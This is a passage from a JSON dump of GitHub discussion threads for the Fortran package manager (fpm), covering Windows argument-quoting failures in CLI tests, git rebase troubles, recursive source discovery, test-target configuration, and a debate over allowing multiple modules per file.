                    "text": "Seems like it is having trouble with the Shake system again.  I can remove the test and put the files back in the top directory as I think the problem in test17 is likely due with the way quoting is done on MSWindows or arguments are passed to an executable and unfortunately I do not have a programming environment on an MSWindows machine; I have access to a CygWin environment but it ran there.  Using a PR to debug is a bit tough, especially as the most I can get to display in Firefox on Redhat is three lines at a time of the log file.  This is getting too slow to proceed at this point. Disappointing, as I think we are well within the reach of having a functional Fortran fpm sans the network-related functionality."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:25:38+00:00",
                    "text": "Did not see the comment. Yes, I did not release pushing out another version would clobber your changes. Not sure what I do to avoid that as I thought your change was independent of this PR. I am quite curious what a debug run with the changes I just added would show, as not that familiar with MSWindows as a programming platform. This is the kind of stuff the test was intended to find, even if I did not expect any (M_CLI2 is a subset of code that has been used for years in hundreds of codes on many Unix and Linux systems. That is why you test I guess :>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 19:47:40+00:00",
                    "text": "A force push generally means you're about to clobber something. In the case that someone has made changes on the branch, general practice is to do git pull --rebase before git push. I'll get it back."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:54:00+00:00",
                    "text": "Read the stack overflow descriptions. I think the headache will pass; but I might have to tweek M_CLI2 to detect the OS; just having trouble figuring out how it will work in Powershell versus MSWindows CLI mode versus called from a .bat file, etc. Thanks for the link. It would have been particularly confusing without knowing MSWindows was confused in the first place."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 20:16:36+00:00",
                    "text": "No problem. We're super close."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 00:58:36+00:00",
                    "text": "I have been using a line-mode command called git-pull-request that a friend swears by, and the --force appears to be built in so I need to figure out how to do this manually;  the MSWindows quoting issue is bizarre. I may have to build a programming environment on an MSWindows machine to see if I can sort it out. I got diffferent issues with quoting using simple scripts in PowerShell and a cmd window with a .bat file and from calling a program I built in Cygwin from a cmd window (works fine in CygWin window). And having problems with the website from my browser. It looks like test15 worked which if the code I think is pushed there is there should be having the same issue. Really hard to look at. That is an outlier case I would like to just comment out and solve as a seperate issue. Wondering if the PC version of the Haskell version has any issues with arguments with spaces in an --args option and if not that might be a good clue. Can you just comment those tests out for now if that is simple? I would really like to get this moving and work on the changes in the \"NEW\" PR and get a basic functioning fortran version for simple local cases available and have something I think everyone case work with in that \"NEW\" PR."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 01:12:16+00:00",
                    "text": "Ok, that should fix it. I'm good with going ahead and merging this and opening an issue to deal with the Windows side later. I'll give everybody else a day to veto that before actually doing so though."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 02:04:34+00:00",
                    "text": "Great. Thanks!"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 06:27:30+00:00",
                    "text": "Sorry, late to the party. I might be able to give a hint on the Windows issue. You can't escape using single quotes on the command line on Windows. Both failing tests, 13 and 17 are escaping their whitespace with single quotation marks / apostrophes, if I'm not mistaken."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 07:33:47+00:00",
                    "text": "It does indeed work, see: e0f9499 and the corresponding Windows test:\nSTART:  TEST 17 CMD=test proj1 p2 project3 --release -- arg1 -x \"and a long one\"\n arguments seen directly by program\n0[test]\n0[proj1]\n0[p2]\n0[project3]\n0[--release]\n0[--]\n0[arg1]\n0[-x]\n0[and a long one]\n\n\nNote, j is the counter for the loop and i used uninitialized here, therefore we get zeros instead of useful numbers:\n\n  \n    \n      fpm/fpm/test/cli_test/cli_test.f90\n    \n    \n        Lines 168 to 171\n      in\n      af6fa0d\n    \n    \n    \n    \n\n        \n          \n           do j=1,command_argument_count() \n        \n\n        \n          \n              call get_command_argument(number=j,value=big_argument,length=ilen) \n        \n\n        \n          \n              write(*,'(*(g0))')i,'[',big_argument(:ilen),']' \n        \n\n        \n          \n           enddo \n        \n    \n  \n\n\n\n\nThe only drawback is that the CLI will fail consistently for all OS, which might look like a step back on first sight. The problem is that the namelist is reading single quotes over double quotes, and therefore mismatches the simple equals test at\n\n  \n    \n      fpm/fpm/test/cli_test/cli_test.f90\n    \n    \n         Line 126\n      in\n      af6fa0d\n    \n    \n    \n    \n\n        \n          \n           call test_test('ARGS',act_args.eq.args) \n        \n    \n  \n\n\nwith the input\n-'arg1' -x 'and a long one'\n+\"arg1\" -x \"and a long one\"\nI tried to fix it by changing the delim argument for the namelist IO, but this doesn't help."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-25 10:52:47+00:00",
                    "text": "I was intrigued by this and therefore (a bit of procrastination ;)) I\nconcocted a small test program and ran that on the following platforms:\n\n   - Linux (gfortran and Intel Fortran)\n   - plain Windows (Intel Fortran)\n   - Cygwin (gfortran)\n   - MinGW (gfortran)\n\nI used the following commands:\n\ncmdline.exe A B C D\ncmdline.exe 'A B C D'\ncmdline.exe \"A B C D\"\ncmdline.exe '*.f90'\ncmdline.exe \"*.f90\"\n\nThe results are, well, interesting. The details are contained in the\nattached zip-file (tstcmdline is a simple shell script, rename it to\ntestcmdline.bat for Windows - gmail did not accept in the zip-file).\n\nThe short message: Linux and Cygwin essentially work in the same way, MinGW\nexpands the file mask in the fourth command and Windows  and MinGw do not\ngroup on  apostrophes, only on quotation marks.\n\nOp vr 25 sep. 2020 om 11:43 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n *@LKedward* approved this pull request.\n\n Thanks again @urbanjost <https://github.com/urbanjost>. This looks good.\n +1 to merge so that #188 <#188>\n can move forward with review.\n Please open an issue to document the windows command line problems when\n you get a chance.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#182 (review)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6AS7SPKQMOTYIPQFDSHRQ3VANCNFSM4RT2CWCQ>\n ."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 13:30:52+00:00",
                    "text": "@awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string? So in order to preserve a string round-trip, one must use single quotes (')?\n@awvwgk and @arjenmarkus, this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\nDoes this effectively lead us to contradicting requirements? The test requires the use of single quotes to preserve the arguments round trip through namelist, but Windows requires the use of double quotes to preserve the string as being a single argument. Is there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\nThanks @awvwgk and @arjenmarkus for your help fleshing this out."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 14:21:16+00:00",
                    "text": "@awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string?\n\nThe short, but incorrect, answer is yes. The correct answer is that the namelist write step does not know about the type of quotation due to the recursive execution of the test binary and therefore cannot preserve anything.\n\nSo in order to preserve a string round-trip, one must use single quotes (')?\n\nNo, this is actually the wrong conclusion. The assumption that we can use single quotes (') in a cross platform application is wrong. Also the assumption that we can compare a command line by equality in the testsuite is not correct.\n\n@awvwgk and @arjenmarkus, this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\n\nThat is indeed correct. Single quotes are officially not supported to escape arguments in PowerShell and CMD on Windows. Note that testing cygwin on Windows introduces a POSIX shell, which will mitigate the problem, therefore cygwin is consistent with OSX and Ubuntu in the testsuite.\n\nDoes this effectively lead us to contradicting requirements?\n\nNo, the assumption for writing the test suite is assuming a POSIX shell and relying on an implementation detail of the namelist IO with GCC (and possibly other compilers as well) to always use single quotation marks.\n\nIs there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\n\nMy opinion on this is that the implementation is not portable and should be fixed before being merged. I gave it a try already, but I cannot find a simple way to fix the quotation mark issue since this information is just lost in the shell execution and the subsequent usage of namelist IO."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 16:27:02+00:00",
                    "text": "Just a point of clarification, which part of \"the implementation is not portable\"? If it is just the tests that are not portable, I think merging now and finding a different testing method later is acceptable. The other tests are sufficiently demonstrating the CLI to be working properly (or at least sufficiently for current requirements), and even the non-portable tests are demonstrating that it works under environments that preserve the intended behavior of the tests.\nIn my opinion, I don't think the CLI should be required to recombine \"erroneously split\" arguments. I think trying require a CLI to \"fix\" \"improperly\" split command line arguments in Windows environments would be akin to trying to ask it to \"fix\" \"improperly\" expanded glob (i.e. *.f90) arguments from a posix environment. It's just out of scope. It seems to me the current implementation is behaving as expected.\nUnless I missed something."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 17:18:46+00:00",
                    "text": "Yeah, the test suite is not portable.\nThe PR is already lengthy and we can probably fix this later, of course."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 19:31:26+00:00",
                    "text": "I have a change that I think satisfies all the suggest changes and makes a test case I believe will work on MSWindows and POSIX platforms for all but edge conditions, with a change that should allow handling the edge conditions in the future. The -- ARGS option is intriguingly difficult on and MSWindows box. I have a test case I am working on for the case where the arguments are all the printable ASCII characters and the results are \"interesting\" with % characters in particular on windows. Since in this case the shell should have expanded most of the problem characters when the fpm command itself was called I find it difficult to find any kind of typical usage that this version fails on so far.  I tried a simple rebase to avoid clobbering things again and apparently did not get the syntax right so I am hesitant to push this and it seems like a concensus is near. Should I just let this one lay aside for a moment and present this in #188 or I need help on how to make sure another push does not good changes out I am afraid. Suggestions?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 20:22:22+00:00",
                    "text": "So long as you made the commit on this branch, you should be able to run the commands\ngit pull --rebase\ngit push\n\nand it should work fine. If not I should be able to recover anything lost and get it sorted out."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 21:07:42+00:00",
                    "text": "Well that was interesting. It did not work that simply as I had followed some web pages earlier trying to get past some of the earlier issues that required me to try to try something more involved; and I was following some git directions and got some interesting messages and then my machine crashed and now all but the ubuntu test have been running a long time without completing. I am not going to try anything else."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 21:21:31+00:00",
                    "text": "Ok, that looks like it clobbered, pretty much everything. I'm going to force push back to the latest state I had. Any chance you could redo the the changes you made?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 22:40:03+00:00",
                    "text": "Managed to break git(1). restoring from system backup. The web page seems to have a page from a previous file in the NEW PR that was never in the CLI branch."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-26 03:12:03+00:00",
                    "text": "The restore is complete, but need to take you up on that offer to reinstall you changes. I have no intention of changing it again unless there is something I do not see that did not restore."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 18:32:35+00:00",
                    "text": "I restored everything. One more time?\n\u2026\n     On 09/25/2020 5:21 PM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     Ok, that looks like it clobbered, pretty much everything. I'm going to force push back to the latest state I had. Any chance you could redo the the changes you made?\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3J5T44KP2XROUI3TDLSHUCWRANCNFSM4RT2CWCQ ."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 19:27:53+00:00",
                    "text": "It makes it clear to me that there are disadvantages to Fortran only supporting the equivalent of system(3c) and not the exec(3c) familiy of C routines. Being required to call the system and thus exposing any spawned command to the vagaries of the OS shell and subsequent expansion and globbing makes it much harder to write a reliably portable program using subprocesses; especially because of the number of variations in MSWindows where escaping with ^ is not always reliable, and sometimes \\ is used and that the program might be running in several environments with different parsing rules. Changing the M_CLI2 interface to \" instead of ' makes this reasonably portable without having to determine the OS, but staying with a pure Fortran solution (ie. without calling C) the best solution seems to not requote the parameters as M_CLI2 does in this case, but to use the values directly obtained from the get_command_arguments(3f) function and conditionally requote them based on the system being called by execute_system_command(3f) for outliers with special characters which I will try to capture as a remaining issue, but specifically specifying the DELIM for the sake of the NAMELIST group tests and changing to a \" from a ' seems to be doing a better job than many MSWindows commands and other packages. This experience helps justify the full round-trip test as only being exposed to the system parsing exposes the problem, on the bright side.\n\u2026\n     On 09/25/20I20 9:31 AM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     @awvwgk https://github.com/awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string? So in order to preserve a string round-trip, one must use single quotes (')?\n\n     @awvwgk https://github.com/awvwgk and @arjenmarkus https://github.com/arjenmarkus , this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\n\n     Does this effectively lead us to contradicting requirements? The test requires the use of single quotes to preserve the arguments round trip through namelist, but Windows requires the use of double quotes to preserve the string as being a single argument. Is there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\n\n     Thanks @awvwgk https://github.com/awvwgk and @arjenmarkus https://github.com/arjenmarkus for your help fleshing this out.\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3L5FB6GELSDPICF4H3SHSLR3ANCNFSM4RT2CWCQ ."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 20:32:37+00:00",
                    "text": "Despite the git related hiccups, this is now working (\ud83d\ude04), so I'm going to go ahead and merge. Thanks for all your effort on this @urbanjost"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 21:52:17+00:00",
                    "text": "Thank you!  Thanks everyone for all the support an suggestions\n\u2026\n     On 09/27/2020 4:32 PM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     Despite the git related hiccups, this is now working (\ud83d\ude04), so I'm going to go ahead and merge. Thanks for all your effort on this @urbanjost https://github.com/urbanjost\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3JG5ZMOEEQGA72736TSH6OPFANCNFSM4RT2CWCQ ."
                }
            ]
        },
        {
            "number": 181,
            "user": "urbanjost",
            "date": "2020-09-19 22:01:23+00:00",
            "title": "simple CLI interface for all commands using M_CLI2",
            "text": "An implimentation of a CLI interface based on the most\nrecent master for discussion with @everythingfunctional",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-19 23:08:26+00:00",
                    "text": "Thanks!\n\u2026\nOn Sat, Sep 19, 2020, at 5:01 PM, urbanjost wrote:\n An implimentation of a CLI interface based on the most\n recent master for discussion with @everythingfunctional\n <https://github.com/everythingfunctional>\n\n You can view, comment on, or merge this pull request online at:\n\n   #181\n\n Commit Summary\n\n  * simple CLI interface for all commands using M_CLI2\n File Changes\n\n  * *M* fpm/fpm.toml\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-7b7f15ad033448e9fa834a26171257de> (3)\n  * *M* fpm/src/fpm.f90\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-e235e41ae1a801d1ff11bfa3aa1ea6db> (133)\n  * *M* fpm/src/fpm_command_line.f90\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-7fc26592b0babf0895d006b372f1ec37> (192)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/181.patch\n  * https://github.com/fortran-lang/fpm/pull/181.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#181>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDWKG2RRQMA37KSDADSGUS37ANCNFSM4RTICRKQ>."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-20 01:55:37+00:00",
                    "text": "It says it fails on a file that was a working file on windows that ends in \".f90.\".  I added the dot to keep it from being used, which worked on Linux.  I deleted the file, it is just fodder for a new demo. Interesting it picked up that file even though it did not end in \".f90\". Not sure if how the checks work; if it will pull a new dependency and run again or not."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 06:58:07+00:00",
                    "text": "Thanks @urbanjost. The error was a Windows/git error; it is illegal for a filename to end in a dot on Windows so the git checkout failed. I've rerun the checks and all seems fine now.\nI will look over this PR today"
                }
            ]
        },
        {
            "number": 180,
            "user": "LKedward",
            "date": "2020-09-19 12:57:38+00:00",
            "title": "Recursive source discovery",
            "text": "Updates list_files routine with capability to recursively discover files in subdirectories;\nadd_sources_from_dir now calls list_files in recursive mode;\nUpdates 'hello_complex' example package with additional module in subdirectory to demonstrate and test this.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-19 16:30:03+00:00",
                    "text": "Looks great, thanks!\n\u2026\nOn Sat, Sep 19, 2020, at 8:40 AM, Sebastian Ehlert wrote:\n\n\n ***@***.**** approved this pull request.\n\n Very nice, I did a quick check on `toml-f`, which is using a rather\n deep directory structure, and it was built correctly \ud83d\udc4d. The\n implementation also looks good to me.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#180 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWGTIDTUYYFEU3F34WDSGSYGXANCNFSM4RTAJAFQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:39:45+00:00",
                    "text": "Thank you, @LKedward! Merging."
                }
            ]
        },
        {
            "number": 179,
            "user": "awvwgk",
            "date": "2020-09-18 22:25:57+00:00",
            "title": "Testing with fpm test",
            "text": "Since @milancurcic brought it up in #177 (comment), it might be worth to have a way to define unit tests within a test target, i.e. \u201cexport\u201d tests from our testing framework as test targets to fpm test. I am also thinking of tests that will require external resources, we cannot really define in a unit test.\nAn example is the consistency test of the version number specified in the fpm.toml, meson.build or CMakeLists.txt and the internal one in a *_version module. In this case we would either like to get the correct fpm.toml as argument and parse it or have the build system pass the version string as command line argument. The unit test without arguments will usually be useless. The alternative would be to generate the *_version module with configure_file from a template, but this is nothing we can do with fpm (yet).\nOther examples might be test targets requiring correctly set environment variables or test binaries that can run different tests depending on a test input file. The binary might even be an external program that takes an executable as input and provides it with input by some convention (i.e. STDIN) and expects a correct response (i.e. STDOUT or error code).\nI am facing four different test scenarios with toml-f, for which I am relying on the unit test framework of meson and it does a pretty decent job to orchestrate those different scenarios. Only one of them would be supported by fpm right now. Here are the test definitions for reference: https://github.com/toml-f/toml-f/blob/master/test/meson.build.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-22 02:27:08+00:00",
                    "text": "@awvwgk thanks for the idea. Can you give an example how it could look like from a user perspective for toml-f using fpm?\nI would prefer if things can somehow work automatically so that users don't have to code a file like https://github.com/toml-f/toml-f/blob/cb04d91e55872f390210a63c3468f168c0da4cbd/test/meson.build, which seems quite long. Is the problem in different dependencies for tests?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 08:12:40+00:00",
                    "text": "Let's assume fpm would support a configure_file like syntax, a hypothetical transcription of my test definitions for toml-f with fpm could look like this:\n# Check if the internal version number matches the package version number\n[[test]]\nname = \"tftest-version\"\nmain = \"version.f90\"\nsource-dir = \"test\"\n[[test.target]]\nargs = [\"@package-version@\"]  # returns entry from package%version\n\n# Check content of a local file (fpm.toml) for the version number\n# Note: this test is actually redundant for fpm, if the first case works,\n#       meson and CMake currently use this since fpm can't check itself\n[[test]]\nname = \"tftest-fpm\"\nmain = \"fpm.f90\"\nsource-dir = \"test\"\n[[test.target]]\n# given the current scope, the current source directory should be \"test\"\nargs = [\"@fpm-current-source-dir@/../fpm.toml\"]\n# alternatively, if we have a package scope, this might work:\n# args = [\"@fpm-source-dir@/fpm.toml\"]\n\n# This is already valid with fpm\n[[test]]\nname = \"tftester\"\nmain = \"tftest.f90\"\nsource-dir = \"test\"\n\n# Now the complicated part\n# Decoder test, check if the deserialization of TOML documents produces the correct data structures\n[[test]]\nname = \"toml2json\"\nmain = \"toml2json.f90\"\nsource-dir = \"test\"\n[[test.target]]\n# requires an external program to perform testing\nexecutable.find = \"toml-test\"\n# referencing of the test executable is required\nargs = [\n  \"-testdir\", \"@fpm-source-dir@/subprojects/toml-test\",\n  \"@fpm-current-binary-dir@/toml2json\",\n]\n[[test.target]]\nexecutable.find = \"toml-test\"\nargs = [\"@fpm-current-binary-dir@/toml2json\"]\n\n# Encoder test, check if the serialization of data structures produces correct TOML documents\n[[test]]\nname = \"json2toml\"\nmain = \"json2toml.f90\"\nsource-dir = \"test\"\n[[test.target]]\nexecutable.find = \"toml-test\"\nargs = [\"-encoder\", \"@fpm-current-binary-dir@/json2toml\"]\nCertainly, the test definitions won't get much shorted compared to the declarations in the meson.build of toml-f. I actually prefer to be explicit about the declarations.\nFor the sake of the discussion, we can ignore the second half of the tests for now, if they don't fit into fpm's scope of testing (I currently don't support them in CMake as well because they are a bit more involved and so far only meson is able to handle this test scenario gracefully).\nBut supporting the first two scenarios (tftest-version and tftest-fpm) in some way would be great."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-12-23 00:32:01+00:00",
                    "text": "At least for the first scenario, I believe in Cargo it is done using environment variables. Quoting the relevant sections:\n\nCargo exposes these environment variables to your crate when it is compiled. Note that this applies for running binaries with cargo run and cargo test as well. To get the value of any of these variables in a Rust program, do this:\nlet version = env!(\"CARGO_PKG_VERSION\");\n\nversion will now contain the value of CARGO_PKG_VERSION.\n\nIn rust env! is a macro which inspects an environment variable at compile time! Then you just need to assert the environment variable version (coming from the manifest file) is equal to the parameter in your Fortran API.\nFor the second version you could use an environment variable FPM_MANIFEST_DIR.\nFor the remaining cases I have the feeling it can be done with the environment variables:\n\n\nCARGO_BIN_EXE_<name> \u2014 The absolute path to a binary target's executable. This is only set when building an integration test or benchmark. This may be used with the env macro to find the executable to run for testing purposes. The <name> is the name of the binary target, exactly as-is. For example, CARGO_BIN_EXE_my-program for a binary named my-program. Binaries are automatically built when the test is built, unless the binary has required features that are not enabled."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-23 16:40:20+00:00",
                    "text": "The Rust macro processor is quite powerful, but we would have to emulate something like this with fypp or cpp.\nUsing environment variables at runtime would be the (easier) alternative, which again leads to the problem how we to specify those in the package manifest in case we need non-standard information."
                }
            ]
        },
        {
            "number": 178,
            "user": "LKedward",
            "date": "2020-09-18 11:07:31+00:00",
            "title": "Add more example packages",
            "text": "Adds: new example package for including c code;\nAdds: new example package for using submodules;\nAdds: README describing each example package and supported fpm version;\nFixes: parsing bug where submodule names were not added to modules_provided array;\nFixes: parsing bug where leading spaces were not removed from parsed strings.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 17:59:47+00:00",
                    "text": "\ud83d\udc4d from me. Do you agree on also adding this example package:\nmodule_in_program_source/\n  app/\n    main.f90\n  fpm.toml\n\nwhere main.f90 is:\nmodule greet_m\n  implicit none\n  character(*), parameter :: greeting = 'Hello, fpm!' \nend module greet_m\n\nprogram module_in_program_source\n  use greet_m, only: greeting\n  implicit none\n  print *, greeting\nend program module_in_program_source\nWe're supporting this implicitly without special care, but we should make sure to not break the support."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-18 18:30:34+00:00",
                    "text": "Thanks @milancurcic. Good point yes I agree, I'll add that example in too."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-18 19:36:46+00:00",
                    "text": "I'm not sure I agree that we do want to support having a module in the same file with a program. We don't support having multiple modules in one file. Is there a reason for wanting this capability?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 19:51:48+00:00",
                    "text": "For me it's convenience for toy programs;\nIt's valid Fortran;\nThere is existing production Fortran software that does this (multiple modules in one source file)\n\n\nWe don't support having multiple modules in one file.\n\nWe do, I just tried it. :)\nI get that many people may not care about this, but I think you need a strong argument to disallow valid code."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-18 20:03:08+00:00",
                    "text": "I similarly find it useful now and again to put a module and a program together for small supporting programs like tests, demos and benches. This is fairly common usage I believe.\nMy main quarrel with disallowing this, and other valid fortran layouts, is with the enforcement of design decisions on users by constraint. This is not the job of a build tool IMO.\nRegarding existing support, I believe it is supported to the extent that the module in question is not used by any other file."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-18 21:28:30+00:00",
                    "text": "I find it somewhat useful when tooling (if not the language itself) can at least discourage known, poor design decisions. Similar to the way most modern languages don't have a goto. But if there is sufficient desire, and some use cases where it would lead to better design, I'm ok with it. I don't know if that's the case, but I'm open to being shown some.\nAre there any other languages that allow multiple modules in one file?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 16:38:08+00:00",
                    "text": "I agree with Brad. But similarly I am for restricting the naming of modules to enforce directory structure, but if I recall correctly, Brad was against.\n\nThe fact that current codes use something is not a good argument because current codes would require some modifications anyway to compile with fpm.\n\nI think a good way forward is to restrict with an fpm.toml option (we can discuss whether the option should be on or off by default). That way we can satisfy both camps.\n\nI definitely would like an option in fpm to warn against non standard usage.\n\nHuge advantage of being strict is that it simplifies the available options, which makes it easier to understand other people's codebases.\n\u2026\nOn Fri, Sep 18, 2020, at 4:28 PM, Brad Richardson wrote:\n\n\n I find it somewhat useful when tooling (if not the language itself) can\n at least discourage known, poor design decisions. Similar to the way\n most modern languages don't have a `goto`. But if there is sufficient\n desire, and some use cases where it would lead to better design, I'm ok\n with it. I don't know if that's the case, but I'm open to being shown\n some.\n\n Are there any other languages that allow multiple modules in one file?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVXFLWYQYOSEHW5DLSGPGI3ANCNFSM4RR2MP5A>."
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 16:39:54+00:00",
                    "text": "Regarding quick tests: \"fpm new\" will create you an executable with a module, properly in separate files, so I intend to use that.\n\u2026\nOn Sat, Sep 19, 2020, at 11:37 AM, Ond\u0159ej \u010cert\u00edk wrote:\n I agree with Brad. But similarly I am for restricting the naming of\n modules to enforce directory structure, but if I recall correctly, Brad\n was against.\n\n The fact that current codes use something is not a good argument\n because current codes would require some modifications anyway to\n compile with fpm.\n\n I think a good way forward is to restrict with an fpm.toml option (we\n can discuss whether the option should be on or off by default). That\n way we can satisfy both camps.\n\n I definitely would like an option in fpm to warn against non standard usage.\n\n Huge advantage of being strict is that it simplifies the available\n options, which makes it easier to understand other people's codebases.\n\n On Fri, Sep 18, 2020, at 4:28 PM, Brad Richardson wrote:\n >\n >\n > I find it somewhat useful when tooling (if not the language itself) can\n > at least discourage known, poor design decisions. Similar to the way\n > most modern languages don't have a `goto`. But if there is sufficient\n > desire, and some use cases where it would lead to better design, I'm ok\n > with it. I don't know if that's the case, but I'm open to being shown\n > some.\n >\n > Are there any other languages that allow multiple modules in one file?\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#178 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWHVXFLWYQYOSEHW5DLSGPGI3ANCNFSM4RR2MP5A>.\n >"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-19 18:04:32+00:00",
                    "text": "I agree with having fpm print a warning (recommendation, really) if it finds multiple modules or module + program in a source file.\nI don't like the idea of restricting this with an option because if you expressly don't want to do this, then you're already not writing code that needs to be restricted. Conversely, if the default is to restrict it, then having to add an option to enable it somewhat defeats the purpose of me using it for convenience.\nIf you're against a correct default behavior that is supported in the present and want to disable it as a feature, you need to convince others, not the other way around. \"known, poor design decisions\" is subjective and not meaningful without elaborating why."
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 21:13:10+00:00",
                    "text": "Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package. However, if we relax the requirements now, we can't easily make them more strict without breaking existing packages.\n\nRegarding the warning, I don't know if I would like to be getting warnings for things that are allowed. In other words, Milan, would you like to be getting warnings for modules in the same file as the main program?\n\nSummary: let's be very conservative with relaxing restrictions. It's a one way street.\n\u2026\nOn Sat, Sep 19, 2020, at 1:04 PM, Milan Curcic wrote:\n\n\n I agree with having fpm print a warning (recommendation, really) if it\n finds multiple modules or module + program in a source file.\n\n I don't like the idea of restricting this with an option because if you\n expressly don't want to do this, then you're already not writing code\n that needs to be restricted. Conversely, if the default is to restrict\n it, then having to add an option to enable it somewhat defeats the\n purpose of me using it for convenience.\n\n If you're against a correct default behavior that is supported in the\n present and want to disable it as a feature, you need to convince\n others, not the other way around. \"known, poor design decisions\" is\n subjective and not meaningful without elaborating why.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVGF2O6K2SQWD4DPLSGTXDZANCNFSM4RR2MP5A>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 08:52:12+00:00",
                    "text": "Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package.\n\nI don't think we should consider deferring this decision.\nI think Milan makes a very important point: having no restrictions does not affect those who want to conform to their own standard for layout, but enforcing restrictions does affect those who do not. By placing restrictions on otherwise valid Fortran you are enforcing one group's subjective preference on everyone.\n\nRegarding the warning, I don't know if I would like to be getting warnings for things that are allowed.\n\nThere are some situations where I learn to live with certain compiler warnings, because I know why those warnings exist and why I have chosen to ignore them. This would be the same in this case."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 12:47:01+00:00",
